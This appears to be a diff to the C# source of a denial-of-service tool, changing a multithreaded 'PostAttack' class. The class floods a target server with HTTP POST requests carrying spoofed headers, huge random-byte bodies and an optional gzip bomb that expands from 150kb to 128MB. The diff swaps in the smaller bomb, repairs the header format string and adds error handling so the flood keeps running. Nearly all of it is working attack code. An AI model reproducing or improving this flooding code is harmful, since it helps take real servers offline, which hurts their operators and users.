@@ -12,21 +12,22 @@ namespace GAS.Core
     {
         #region Variables
         bool init = false;
-        public IPAddress IP, DNS;
+        public IPAddress IP;
+        string DNS;
         public string Subsite;
         private Random rnd = new Random();
         private bool random, usegZip, IPOrDns = true, Resp;
         private Thread[] WorkingThreads;
         private volatile string AttackHeader = "";
-        byte[] GZIPBomb = Properties.Resources._1gz;//contains gzipped dump of /dev/zero. gzipped size=1.2Mb, real = 1GB
+        byte[] GZIPBomb = Properties.Resources._128mz;//contains gzipped dump of /dev/zero. gzipped size=150kb, real = 128MB
         #endregion
         public PostAttack(string dns, string ip, int port, string subSite, bool resp, int delay, int timeout, bool random, bool usegzip, int threadcount)
         {
             ThreadCount = threadcount;
             WorkingThreads = new Thread[ThreadCount];
             this.IsDelayed = false;
-            try { this.DNS = IPAddress.Parse(dns); }
-            catch { this.DNS = this.IP; }
+            try { this.DNS = dns; }
+            catch { this.DNS = this.IP.ToString(); }
             try { this.IP = IPAddress.Parse(ip); }
             catch
             {
@@ -73,9 +74,8 @@ namespace GAS.Core
                 int snd = new Random().Next(1024 * 1024 * 64);
                 #region Headers
                 buf = System.Text.Encoding.ASCII.GetBytes(
-                 String.Format("POST {0} HTTP/1.1\r\nHost: {2}\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n{3}\r\nContent-Type: {4}\r\nContent-Length: {5}\r\n\r\n",
+                 String.Format("POST {0} HTTP/1.1\r\nHost: {1}\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n{2}Content-Type: {3}\r\nContent-Length: {4}\r\n\r\n",
                                        Subsite,
-                                       Functions.RandomString(),
                                        DNS,
                                        ((usegZip) ? ("Content-Encoding: gzip" + Environment.NewLine) : ""),
                                        "application/x-www-form-urlencoded",
@@ -90,7 +90,7 @@ namespace GAS.Core
                     #region Connect
                     Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                     States[MY_INDEX_FOR_WORK] = ReqState.Connecting;
-                    try { socket.Connect(this.IPOrDns ? IP : DNS, Port); }
+                    try { socket.Connect(IP, Port); }
                     catch { continue; }
                     socket.Blocking = Resp;
                     States[MY_INDEX_FOR_WORK] = ReqState.Requesting;
@@ -104,11 +104,15 @@ namespace GAS.Core
                             Random rnd = new Random();
                             int buflengt = 60000;
                             byte[] sendbuf = new byte[buflengt];
-                            do
+                            try
                             {
-                                for (int o = 0; o < buflengt; sendbuf[o++] = (byte)rnd.Next(255)) ;
+                                do
+                                {
+                                    for (int o = 0; o < buflengt; sendbuf[o++] = (byte)rnd.Next(255)) ;
+                                }
+                                while ((i += socket.Send(buf, SocketFlags.None)) < snd);
                             }
-                            while ((i += socket.Send(buf, SocketFlags.None)) < snd);
+                            catch { }
                         }
                         #endregion
                         #region gzipbomb
@@ -119,13 +123,17 @@ namespace GAS.Core
                             MemoryStream mb = new MemoryStream(GZIPBomb);//stream to gzip bomb for comfortable usage
                             mb.Seek(0, SeekOrigin.Begin);
                             int r = 0;//read data
+                            try
+                            {
                             do
                             {
                                 mb.Seek(i, SeekOrigin.Begin);//
                                 if ((r = mb.Read(buf, 0, buf.Length)) < buf.Length)
                                     Array.Resize<byte>(ref buf, r);
                             }
-                            while ((i += socket.Send(buf, SocketFlags.None)) < GZIPBomb.Length);
+                            while (socket.Connected&& (i += socket.Send(buf)) < GZIPBomb.Length);
+                            }
+                            catch { }
                         }
                         #endregion
                         #endregion
@@ -139,8 +147,7 @@ namespace GAS.Core
                         try
                         {
                             recvd = 0;
-                            do { recvd = socket.Receive(recvBuf); }
-                            while (false);//(recvd > bfsize) && socket.Connected);
+                            recvd = socket.Receive(recvBuf); 
                             Downloaded++;
                         }
                         catch { Failed++; }
